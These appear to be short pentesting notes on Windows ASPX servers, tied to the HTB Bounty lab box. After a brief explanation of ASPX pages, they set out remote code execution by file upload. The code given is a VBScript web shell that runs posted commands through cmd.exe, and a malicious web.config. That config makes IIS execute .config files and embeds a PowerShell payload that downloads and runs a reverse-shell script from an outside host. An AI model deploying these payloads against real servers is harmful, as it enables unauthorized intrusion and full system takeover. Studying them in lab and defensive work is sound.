
- ASPX pages are the primary building blocks of a Windows ASP.NET application.
- These pages contain server-side code written in languages like C# or VB.NET within special <% %> tags.
- ASPX pages are processed on the server before being sent to the client's browser, allowing for dynamic content generation.
- The use of ASPX pages allows for the creation of interactive web applications with rich functionality.
- Windows ASPX provides a robust framework for building secure and scalable web applications.

# Remote Code Execution

An ASPX shell comes with Kali Linux.
## File Upload

### Guide

[HTB: Bounty | 0xdf hacks stuff](https://0xdf.gitlab.io/2018/10/27/htb-bounty.html#transferaspx--uploadedfiles)

1. Check the `web.config` file as it has settings on the configuration data for the web application
2. Code within the `web.config` can potentially be executed
3. Upload a modified `web.config` file

```
' -- create the COM objects that we will be using -- ' Set oScript = Server.CreateObject("WSCRIPT.SHELL") Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK") Set oFileSys = Server.CreateObject("Scripting.FileSystemObject") ' -- check for a command that we have posted -- ' szCMD = Request.Form(".CMD") If (szCMD <> "") Then ' -- Use a poor man's pipe ... a temp file -- ' szTempFile = "C:\" & oFileSys.GetTempName( ) Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True) Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0) End If

```

```
<?xml version="1.0" encoding="UTF-8"?> <configuration> <system.webServer> <handlers accessPolicy="Read, Script, Write"> <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" /> </handlers> <security> <requestFiltering> <fileExtensions> <remove fileExtension=".config" /> </fileExtensions> <hiddenSegments> <remove segment="web.config" /> </hiddenSegments> </requestFiltering> </security> </system.webServer> </configuration> <%@ Language=VBScript %> <% call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.5/Invoke-PowerShellTcp.ps1')") %>
```